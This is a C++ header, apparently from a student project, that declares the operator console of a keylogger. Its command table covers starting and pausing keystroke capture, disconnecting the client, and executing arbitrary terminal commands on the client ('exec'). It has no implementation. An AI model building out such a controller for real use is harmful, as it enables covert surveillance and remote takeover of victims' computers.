//
// Created by aguado_e on 08/11/16.
//

#ifndef USERINPUT_HPP
#define USERINPUT_HPP

#include <string>
#include <vector>
#include <map>

class InputCenter {
public:
  InputCenter();

  void readUserInput();

private:
  enum {
    COMMAND = 0,
    ARG,
    DESC
  };

  const std::vector<std::tuple<std::string, std::string, std::string>> _commands = {
    std::make_tuple("start", "", "Start the keylogger if it's idle"),
    std::make_tuple("stop", "", "Pause the keylogger"),
    std::make_tuple("kill", "", "Stop and disconnect the client"),
    std::make_tuple("exec", "<command>", "Execute the given command in a terminal"),
    std::make_tuple("status", "", "Client activity status"),
    std::make_tuple("delay", "<integer>", "Set the frequency")
  };
  void help() const;
  bool isCommandValid(std::vector<std::string>) const;
  void _sendCommand(std::string) const;
  void _waitResponse() const;

};


#endif //USERINPUT_HPP
